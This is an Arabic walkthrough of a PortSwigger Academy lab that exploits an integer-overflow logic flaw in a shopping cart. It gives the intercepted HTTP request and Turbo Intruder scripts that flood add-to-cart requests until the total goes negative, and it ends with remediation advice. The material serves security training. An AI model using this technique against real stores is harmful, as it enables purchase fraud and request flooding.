# [Low-level logic flaw](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level)

## **`الهدف`**
شراء منتج معين `(Lightweight l33t leather jacket)` بسعر أقل من المُتاح على الموقع ويكون في نطاق الأموال المتوفرة في الحساب داخل اللاب.
## **`خطوات الحل`**
نلاحظ عند محاولة إضافة كمية من منتج إلى سلة الشراء فإنه لا يقبل عددًا أكبر من `99` في المرة الواحدة حتى لو قُمنا باعتراض الـ `request`باستخدام الـ `Burp Suite.`

ولحل هذا اللاب يجب عليك القيام بـ  `Brute Force` على `request` إضافة المُنتج المطلوب إلى سلة الشراء.

```http
POST /cart HTTP/2
Host: 0a6200410320d4d28111deda00250061.web-security-academy.net
Cookie: session=taZAde2LYDABQgiCWJOcle2xuftZq0tl
Content-Length: 36

productId=1&redir=PRODUCT&quantity=1
```

ولنتخلص من بطئ الـ `Burp Suite` المجاني سنستعمل إضافة **Turbo Intruder** المجانية.

ونغير `quantity` إلى `%s (الفراغ / Placeholder القياسي لأداة Turbo Intruder)`.

ونجعل السكريبت يعمل إلى مالانهاية حتى نوقفه يدويًا، ونجعله يقوم بعمل اتصال واحد في نفس الوقت وطلب واحد لكل اتصال ونقوم بعمل `refresh` متواصل لصفحة سلة المشتريات لمراقبة أى تغييرات غريبة.

```python
def queueRequests(target, wordlists):
    # إرسال طلب واحد فقط في المرة بدون توازي أو خطوط أنابيب
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,   
                           # اتصال واحد فقط في نفس الوقت
                           requestsPerConnection=1,   
                           # طلب واحد لكل اتصال
                           pipeline=False,            
                           # تعطيل الـ pipelining تماماً
                           engine=Engine.THREADED
                           )

    # تشغيل غير محدود (مكافئ لـ Null Payloads - Continue indefinitely)
    # نستخدم While True لكي يستمر الإرسال بدون توقف ما لم نوقف يدويًا
    while True:
        # نُرسل قيمة ثابتة '99' للجزء المُحدد في الـ Request
        engine.queue(target.req, '99')

def handleResponse(req, interesting):
    # عرض كل النتائج في الجدول بدون أي فلترة لكي نتابع كل الطلبات
    table.add(req)
```

وسنلاحظ ان السعر الكلي في سلة المشتريات قد تحول إلى سالب بعد حوالى 160 أو 170 `request` فنوقف السكريبت يدويًا.

وهنا يجب أن ناخذ الرقم الكلي بالسالب ونقسمه على (سعر المُنتج × أقصى عدد لكل طلب)

فتكون المعادلة كالأتي: `21371829.96÷(1337×99)=161.46377734 أي حوالى 161 طلب.

ونعود إلى صفحة المُنتج المطلوب شراءه، ونقوم بعمل بـ  `Brute Force` على `request` إضافة المُنتج إلى سلة الشراء مرة أخرى ولكن نضع الحد الأقصى للطلبات بـ `161`

وسنكمل البقية يدويًا حتى يصبح السعر في نطاق الأموال المتوفرة في الحساب داخل اللاب ونُتمم الشراء لينتهي بذلك اللاب.

```python
def queueRequests(target, wordlists):
    
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,   
                          
                           requestsPerConnection=100,   
                           # زيادة عدد الطلبات داخل كل اتصال
                           pipeline=False,            
                           
                           engine=Engine.THREADED
                           )

    # تشغيل محدد بـ 161 طلب فقط ويتوقف السكريبت تلقائيًا

    for i in range(161):
         # نُرسل قيمة ثابتة '99' للجزء المُحدد في الـ Request
        engine.queue(target.req, '99')

def handleResponse(req, interesting): 
    pass
# كلمة pass تجعل الأداة تستقبل الرد من السيرفر وتتجاهله دون  عرضه في الجدول
```
## **`ترقيع الثغرة`**
هناك عدة حلول مثل وضع حد أقصى منطقي لعدد المنتجات في سلة الشراء مثلًا: `1000` قطعة، ويجب وضع آلية للتأكد من أن القيمة الناتجة بعد كل عملية إضافة ما زالت موجبة وأكبر من القيمة السابقة، بالإضافة إلى استخدام أنواع بيانات آمنة لا تقبل السالب مطلقاً وإذا حدث تجاوز للحد تتحول إلى صفر وليس إلى سالب مع استخدام مكتبات برمجية مخصصة للتعامل المالي `(Decimals)`، ويجب وضع حماية ضد كثرة الطلبات لأن الوضع الحالي للموقع هو `No Rate Limiting.`
